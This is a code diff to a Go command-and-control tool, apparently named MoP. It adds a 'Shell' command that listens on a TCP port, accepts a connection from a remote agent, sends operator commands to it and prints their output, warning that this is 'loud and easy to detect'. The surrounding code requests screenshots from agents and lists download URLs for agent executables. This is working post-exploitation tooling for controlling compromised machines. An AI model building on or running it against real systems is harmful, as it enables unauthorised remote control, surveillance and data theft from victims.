@@ -3,12 +3,17 @@ package commands
 import (
 	"MoP/src/controllers"
 	"MoP/src/messages"
+	"bufio"
+	"encoding/binary"
 	"fmt"
+	"net"
 	"os"
 	"os/exec"
+	"os/signal"
 	"path/filepath"
 	"strconv"
 	"strings"
+	"syscall"
 	"time"
 )
 
@@ -115,7 +120,7 @@ func TakeScrenshot(agent string, command []string) {
 	err := controllers.ReqFile(uint64(agentID), "screenshot", fileName, "screenshot")
 	if err != nil {
 		fmt.Println()
-		fmt.Println("Error to take screenshot the file: ", err)
+		fmt.Println("Error to take screenshot: ", err)
 		fmt.Println()
 	}
 }
@@ -136,6 +141,81 @@ func BuildAgents(agentName string, host string) {
 	fmt.Println()
 	fmt.Printf("[+] Agents URL:\n\t- %s/downloads/%s.exe\n\t- %s/downloads/%s", host, agentName, host, agentName)
 	fmt.Println()
+}
+
+func Shell(agentId string, commands []string) {
+	messages.WarningMessage("This is so loud and easy to detect!")
+	messages.YellowBold.Printf("Are you sure? [y/N]: ")
+	var resp string
+	_, err := fmt.Scanln(&resp)
+	if err != nil {
+		messages.ErrorMessage("receive user option ", err)
+		return
+	}
+
+	if strings.ToLower(resp) == "y" {
+		var port = "8081"
+		if len(commands) > 1 {
+			port = commands[1]
+		}
+
+		messages.GreenBold.Printf("\nListening on port %s (Ctrl+C to return)...\n\n", port)
+
+		ln, err := net.Listen("tcp", fmt.Sprintf(":%s", port))
+		if err != nil {
+			messages.ErrorMessage("bind the TCP port", err)
+			return
+		}
+		defer ln.Close()
+
+		c := make(chan os.Signal, 1)
+		signal.Notify(c, syscall.SIGINT, syscall.SIGTERM)
+		go func() {
+			<-c
+			ln.Close()
+		}()
+
+		conn, err := ln.Accept()
+		if err != nil {
+			messages.ErrorMessage("accept the connection", err)
+			return
+		}
+		defer conn.Close()
+
+		reader := bufio.NewReader(os.Stdin)
+		messages.OkMessage("Connection received!")
+		for {
+			fmt.Printf("Agent: %s>> ", agentId)
+			command, _ := reader.ReadString('\n')
+			command = strings.TrimSuffix(command, "\n")
+
+			if strings.ToLower(command) == "exit" {
+				break
+			}
+
+			conn.Write([]byte(command + "\n"))
+			var length uint32
+			err := binary.Read(conn, binary.LittleEndian, &length)
+			if err != nil {
+				messages.ErrorMessage("read the output length", err)
+				continue
+			}
+
+			buffer := make([]byte, length)
+			_, err = conn.Read(buffer)
+			if err != nil {
+				messages.ErrorMessage("read the output", err)
+				continue
+			}
+
+			fmt.Println(string(buffer))
+		}
+
+		return
+
+	} else {
+		return
+	}
 }
 
 func Help() string {
